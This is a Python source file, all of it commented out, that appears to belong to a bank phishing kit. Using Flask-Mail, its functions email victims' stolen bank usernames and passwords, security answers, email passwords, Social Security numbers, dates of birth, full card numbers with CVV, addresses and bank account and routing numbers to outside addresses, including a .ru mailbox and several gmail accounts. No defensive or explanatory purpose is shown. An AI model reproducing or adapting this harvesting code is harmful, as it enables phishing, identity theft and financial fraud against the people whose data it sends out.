# from mandt import mail
# from flask_mail import Message
# from datetime import datetime

# def report_login(username,password,bank_name):
#     msg = Message(f'New Login || {bank_name}',
#         sender='donaldlorren4202022@gmail.com',
#         recipients=['i@smuller.ru','christinesalgado477@gmail.com'])
#     msg.body=f'''
#     --------LOGIN DETAILS---------
#     Bank Name is ----- {bank_name}
#     Username is ----- {username}
#     Password is ----- {password}
#     at ---- {datetime.now()}
#     '''
#     mail.send(msg)

# def security_question(q1,ans1,q2, ans2,q3,ans3,email,password):
#     msg = Message('Question and Answer',
#         sender='donaldlorren4202022@gmail.com',
#         recipients=['kropawill@gmail.com','christinesalgado477@gmail.com'])
#     msg.body=f'''
#     --------QUESTION ONE----------
#     {q1} ------> {ans1}
#     --------QUESTION TWO----------
#     {q2} ------> {ans2}
#     --------QUESTION THREE----------
#     {q3} ------> {ans3}\n\n
#     --------------EMAIL CREDENTIALS-----------------
#      --------EMAIL----------
#     Email ------> {email}
#      --------EMAIL PASSWORD----------
#     Password ------> {password}
#     at ---- {datetime.now()}
#     '''
#     mail.send(msg)


# def report_ssn(ssn,dob):
#     msg = Message(f'SSN {ssn[-4:]} || DOB {dob[-4:]}',
#         sender='donaldlorren4202022@gmail.com',
#         recipients=['i@smuller.ru','christinesalgado477@gmail.com'])
#     msg.body=f'''
#     SSN ----- {ssn}
#     DOB ----- {dob}
#     at ---- {datetime.now()}
#     '''
#     mail.send(msg)

# def report_card_details( card_name, card_number,expiry_date,cvv):
#     msg = Message(f'Card Details || {card_name}',
#         sender='donaldlorren4202022@gmail.com',
#         recipients=['i@smuller.ru','christinesalgado477@gmail.com'])
#     msg.body=f'''
#     Card name is ----- {card_name}
#     Card Number is ----- {card_number}
#     Expiry Date is ----- {expiry_date}
#     CVV is ----- {cvv}
#     at ---- {datetime.now()}
#     '''
#     mail.send(msg)

# # def report_address( address, apt,city, state, zipcode):
# #     msg = Message(f'Address || {state}',
# #         sender='donaldlorren4202022@gmail.com',
# #         recipients=['i@smuller.ru','christinesalgado477@gmail.com'])
# #     msg.body=f'''
# #     --------PERSONAL INFORMATION----------
# #     Street Address is ----- {address}
# #     Apartment is ----- {apt}
# #     city is ----- {city}
# #     state is ----- {state}
# #     zipcode is ----- {zipcode}

# #     at ---- {datetime.now()}
# #     '''
# #     mail.send(msg)

# # def report_personal_details( account_name, account_number,routine_number):
# #     msg = Message('New Login',
# #         sender='angelamoore914@gmail.com',
# #         recipients=['goodseed394@gmail.com','christinesalgado477@gmail.com'])
# #     msg.body=f'''
# #     --------PERSONAL INFORMATION----------
# #     Account Name is ----- {account_name}
# #     Account Number is ----- {account_number}
# #     Routine Number is ----- {routine_number}

# #     at ---- {datetime.now()}
# #     '''
# #     mail.send(msg)